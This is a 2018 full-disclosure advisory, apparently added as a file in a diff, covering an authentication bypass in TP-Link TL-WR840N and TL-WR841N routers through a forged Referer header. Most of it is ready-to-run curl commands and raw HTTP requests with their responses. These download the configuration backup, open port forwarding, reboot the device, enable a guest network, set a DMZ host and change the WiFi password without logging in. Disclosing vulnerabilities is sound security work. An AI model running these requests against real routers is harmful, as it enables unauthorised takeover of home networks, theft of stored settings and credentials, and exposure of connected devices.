@@ -1,0 +1,207 @@
+Title: TP-Link Multiple Router(TL-WR840N and TL-WR841N) Unauthenticated
+Router Access Vulnerability
+Author: BlackFog Team
+Date: 27 May 2018
+Website: SecureLayer7.net
+Contact: info@securelayer7.net
+
+Version: 0.9.1 4.16 v0001.0 Build 170622 Rel.64334n
+Hardware: TL-WR841N v13 00000013
+
+Version : Firmware Version: 0.9.1 3.16 v0001.0 Build 170608 Rel.58696n
+Hardware Version: TL-WR840N v5 00000005
+
+Vendor Description: TP-Link is the world's #1 provider of consumer WiFi
+networking devices, shipping products to over 120 countries and hundreds of
+millions of customers. (source https://www.tp-link.com/)
+
+
+Attack Description :
+This issue is caused by improper session handling on /cgi/ Folder or /cgi
+file found by Touhid Shaikh(BlackFog Team Member).
+
+if any attacker sends Referer Header with its request and sets Referer:
+http://192.168.0.1/mainFrame.htm dan its no authentication required and an
+attacker can do router's action without authentication.
+below are some of few examples you can see. But the attacker can do mostly
+all of the action on a router without Authentication.
+
+NOTE:  Except admin's password change bcz its required current password for
+changing
+
+##### POC ######
+----------------------- Fail attempt -------------------------
+root@linux:/workspace# curl -i -s -k -X GET http://192.168.0.1/cgi/conf.bin
+HTTP/1.1 403 Forbidden
+Content-Type: text/html; charset=utf-8
+Content-Length: 106
+Connection: close
+
+<html><head><title>403 Forbidden</title></head><body><center><h1>403
+Forbidden</h1></center></body></html>
+
+-----------------------------------------------------
+
+--------------- Seccessfull attempt --------------------------------
+root@linux:/workspace# curl -i -s -k -X GET -H "Referer:
+http://192.168.0.1/mainFrame.htm" http://192.168.0.1/cgi/conf.bin
+HTTP/1.1 200 OK
+Content-Type: application/octet-stream; charset=utf-8
+Content-Length: 5984
+Connection: keep-alive
+
+root@linux:/workspace# curl -s -k -X GET -H "Referer:
+http://192.168.0.1/mainFrame.htm" http://192.168.0.1/cgi/conf.bin >
+backup.bin
+root@linux:/workspace# file backup.bin
+backup.bin: data
+root@linux:/workspace# ls -la backup.bin
+-rw-r--r-- 1 root root 5720 Mar 30 17:17 backup.bin
+
+----------------------------------------------------
+##### POC END ######
+
+
+Evil Actions Without Authentication example.
+============== Burp Request and curl command for conf.bin or backup file
+=================
+
+
+####### Burp ########
+GET /cgi/conf.bin HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Agent22
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.1/mainFrame.htm
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-------Response--------
+HTTP/1.1 200 OK
+Content-Type: application/octet-stream; charset=utf-8
+Content-Length: 5720
+Connection: close
+
+w@\ÝÓb êLýªïÀ‡ÉE‹ûaÉ¬,*-àh[Ú‹³lÙ€ÍÁ.©-
+.....SKIP.......
+8/����W
+
+
+######## Curl ##########
+curl -i -s -k  -X $'GET'     -H $'Host: 192.168.0.1' -H $'User-Agent:
+Agent22' -H $'Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
+$'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H
+$'Referer: http://192.168.0.1/mainFrame.htm' -H $'Connection: close'      $'
+http://192.168.0.1/cgi/conf.bin' > backup.bin
+
+------ take a look in backup.bin file --------
+
+===========================================
+
+
+
+=========== Add Port Forwarding ============
+curl -i -s -k -X POST -H "Host: 192.168.0.1" -H "User-Agent:
+Mozilla/Agent22" -H 'Accept: */*' -H "Referer:
+http://192.168.0.1/mainFrame.htm" --data-binary
+$'[IP_CONN_PORTTRIGGERING#0,0,0,0,0,0#1,1,2,0,0,0]0,5\x0d\x0atriggerPort=23\x0d\x0atriggerProtocol=TCP
+or UDP\x0d\x0aopenProtocol=TCP or
+UDP\x0d\x0aenable=1\x0d\x0aopenPort=23\x0d\x0a' http://192.168.0.1/cgi?3
+
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+[1,1,2,7,0,0]0
+triggerPort=23
+triggerProtocol=TCP or UDP
+openProtocol=TCP or UDP
+enable=1
+openPort=23
+[error]0
+
+----- Decription -----
+enable=0 is for disable
+enable=1 is for enable
+u can change port also.
+====================================
+
+
+
+=========== Reboot Router =========================
+curl -i -s -k -X POST -H "Host: 192.168.0.1" -H "User-Agent:
+Mozilla/Agent22" -H 'Accept: */*' -H "Referer:
+http://192.168.0.1/mainFrame.htm" --data-binary
+$'[ACT_REBOOT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\x0d\x0a' http://192.168.0.1/cgi?7
+
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+[error]0
+
+----Description -----
+error = 0 means reboot seccessully
+======================================
+
+
+
+============= Enable Guest Network ==========================
+curl -i -s -k  -X $'POST' -H $'Host: 192.168.0.1' -H $'User-Agent: Aent22'
+-H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H
+$'Accept-Encoding: gzip, deflate' -H $'Content-Type: text/plain' -H
+$'Referer: http://192.168.0.1/mainFrame.htm' -H $'Content-Length: 844' -H
+$'Connection: close' --data-binary
+$'[LAN_WLAN_MULTISSID#1,1,0,0,0,0#0,0,0,0,0,0]0,1\x0d\x0amultiSSIDEnable=1\x0d\x0a[LAN_WLAN_MSSIDENTRY#1,1,1,0,0,0#0,0,0,0,0,0]1,11\x0d\x0aIsolateClients=0\x0d\x0aEnable=1\x0d\x0aSSID=Agent22\x0d\x0aBeaconType=WPAand11i\x0d\x0aWPAAuthenticationMode=PSKAuthentication\x0d\x0aWPAEncryptionModes=TKIPandAESEncryption\x0d\x0aIEEE11iAuthenticationMode=PSKAuthentication\x0d\x0aIEEE11iEncryptionModes=TKIPandAESEncryption\x0d\x0aPreSharedKey=9876543210\x0d\x0aGroupKeyUpdateInterval=0\x0d\x0aMaxStaNum=32\x0d\x0a[LAN_WLAN_MSSIDENTRY#1,2,1,0,0,0#0,0,0,0,0,0]2,1\x0d\x0aIsolateClients=0\x0d\x0a[LAN_WLAN_GUESTNET#1,1,0,0,0,0#0,0,0,0,0,0]3,8\x0d\x0aLANAccessEnable=1\x0d\x0aUSBAccessEnable=0\x0d\x0aTCEnable=0\x0d\x0aTCMinUpBW=100\x0d\x0aTCMaxUpBW=200\x0d\x0aTCMinDownBW=100\x0d\x0aTCMaxDownBW=200\x0d\x0alastModified=1\x0d\x0a[LAN_WLAN_GUESTNET#1,2,0,0,0,0#0,0,0,0,0,0]4,8\x0d\x0aLANAccessEnable=1\x0d\x0aUSBAccessEnable=0\x0d\x0aTCEnable=0\x0d\x0aTCMinUpBW=100\x0d\x0aTCMaxUpBW=200\x0d\x0aTCMinDownBW=100\x0d\x0aTCMaxDownBW=200\x0d\x0alastModified=0\x0d\x0a'
+$'http://192.168.0.1/cgi?2&2&2&2&2'
+
+------- Description ----------
+SSID=Agent22
+PreSharedKey=9876543210
+=============================================
+
+
+
+======= DMZ enable and Disable on 192.168.0.112 ===========
+curl -i -s -k  -X $'POST'     -H $'Host: 192.168.0.1' -H $'User-Agent:
+Agent22' -H $'Referer: http://192.168.0.1/mainFrame.htm' -H
+$'Content-Length: 78' -H $'Connection: close'     --data-binary
+$'[DMZ_HOST_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,2\x0d\x0aenable=1\x0d\x0aIPAddress=192.168.0.112\x0d\x0a'
+   $'http://192.168.0.1/cgi?2'
+
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Transfer-Encoding: chunked
+Connection: close
+
+[error]0
+
+-------Description -----------
+IPAddress=192.168.0.112
+enable=1 or 0 (enable or disable)
+=================================================
+
+=============== WiFi Password Change =============
+curl -i -s -k  -X $'POST'     -H $'Host: 192.168.0.1' -H $'User-Agent:
+Agent22' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type:
+text/plain' -H $'Referer: http://192.168.0.1/mainFrame.htm' -H
+$'Content-Length: 199' -H $'Connection: close'     --data-binary
+$'[LAN_WLAN#1,1,0,0,0,0#0,0,0,0,0,0]0,5\x0d\x0aBeaconType=11i\x0d\x0aIEEE11iAuthenticationMode=PSKAuthentication\x0d\x0aIEEE11iEncryptionModes=AESEncryption\x0d\x0aX_TP_PreSharedKey=9876543210\x0d\x0aX_TP_GroupKeyUpdateInterval=0\x0d\x0a'
+   $'http://192.168.0.1/cgi?2'
+
+-------Description -----------
+IEEE11iAuthenticationMode=PSKAuthentication
+IEEE11iEncryptionModes=AESEncryption
+X_TP_PreSharedKey=9876543210
+===============================
+
+
+
+======= Report Timeline =============
+30 Mar, 2018 ----- Initial Report (support.in@tp-link.com) (No Response)
+27 May, 2018 ----- Full Disclosure
